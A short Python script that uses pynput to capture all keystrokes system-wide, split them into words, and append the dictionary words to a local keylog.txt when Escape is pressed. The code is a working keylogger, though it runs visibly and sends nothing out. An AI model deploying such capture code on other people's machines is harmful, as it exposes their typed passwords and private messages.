import os
import sys
from pynput import keyboard


FILEPATH = os.path.join(os.path.dirname(__file__), "keylog.txt")
DICTIONARY_PATH = os.path.join(os.path.dirname(__file__), "dictionary.txt")
words = []
text = ""


def load_words(dictionary_path):
    with open(dictionary_path) as word_file:
        valid_words = set(word_file.read().split())

    return valid_words


def word_in_dictionary(dictionary, word):
    return True if word.strip().lower() in dictionary else False
    


def write_to_file(filepath, dictionary, words):
    try: 
        with open(filepath, "a") as writer:
            for word in words:
                # FIXME filters out every word that contains special chars
                # like "!", "?", """, etc.
                if word.isalpha() and word.find("Key.") == -1:
                    if word_in_dictionary(dictionary, word):
                        writer.write(word)
                        writer.write('\n')

            # FIXME -> needed?
            writer.truncate()
    except Exception as e:
        print(f"Error while writing to file: {e}")


def on_press(key):
    # TODO for debugging only -> remove later
    try:
        print(key.char)
    except AttributeError:
        print(key)
        
    global text, words
    if key == keyboard.Key.enter:
        words.append(text)
        text = ""
    elif key == keyboard.Key.tab:
        words.append(text)
        text = ""
    elif key == keyboard.Key.space:
        words.append(text)
        text = ""
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        words.append(text)
        text = ""
    else:
        text += str(key).strip("'")
      
    
def on_release(key):
    if key == keyboard.Key.esc:
        global words
        print("Populating file ...")
        write_to_file(FILEPATH, dictionary, words)
        words = []
        
        # Stop listener
        print("Quitting")
        return False


if __name__ == "__main__":
    try: 
        print("Loading dictionary ...")
        dictionary = load_words(DICTIONARY_PATH)
        
        print("Logging keys ...")
        # Collect events until released
        with keyboard.Listener(
                on_press=on_press,
                on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        sys.exit()
